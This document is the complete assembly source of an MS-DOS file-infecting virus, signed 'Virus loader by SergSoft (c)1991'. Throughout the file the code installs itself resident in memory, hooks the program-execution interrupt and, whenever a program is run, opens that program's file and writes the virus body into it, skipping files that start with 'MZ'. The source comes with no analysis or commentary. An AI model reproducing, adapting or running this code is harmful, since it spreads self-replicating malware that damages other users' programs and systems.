.286
.model tiny
.radix 16
.code
a	equ	0D6
	org	100
e:	dec	bp
	push	cs
	push	si
	push	cs
	mov	al,2E
	push	ax
	mov	es,ax
	xor	di,di
	mov	cl,l-e
	rep	movsb		;es:di = 2F:l-e  ds:si = CS:l-e+100
	push	n-e
	retf
n:	push	si
	mov	si,84
	mov	ds,cx
	cmp	[si],ax
	jz	f
	movsw
	mov	[si-2],ax
	xchg	[si],ax
	stosw
f:	pop	si
	pop	es		;es = CS
	push	es
	pop	ds		;ds = CS
	lodsw
	xchg	cx,ax
	pop	di
	push	di
	rep	movsb		;es:di = CS:100   
	retf
h:	pusha
	push	ds
	push	es
	xor	ah,4bh
	jnz	j		;if not 'exec'
	mov	ax,3D02		;open file
	int	a
	jc	j		;if not found
	xchg	bx,ax		;bx = handler
	mov	ch,8C
	mov	ds,cx		;8C??:2  buffer
	push	ds
	pop	es
	mov	ch,0FA		;all bytes
	xor	di,di
	mov	dx,2
	mov	ah,3F
	int	a		;read all bytes
	cld
	stosw
	cmp	byte ptr [di],4dh
	jz	i
	add	ax,dx
	push	ax
	mov	ax,4200
	cwd
	mov	cx,dx
	int	a
	mov	ah,40
	push	cs
	pop	ds		;ds = 31
	mov	cl,l-e
	int	a		;write virus code
	mov	ah,40
	push	es
	pop	ds
	pop	cx
	int	a
i:	mov	ah,3E
	int	a
j:	pop	es
	pop	ds
	popa
r:	db	0EA
l:	dw	30	
d:	mov	dx,c-d+100
	mov	ah,09
	int	21h
	ret
c:	db	' Virus loader by SergSoft (c)1991',0D,0A,24
end	e
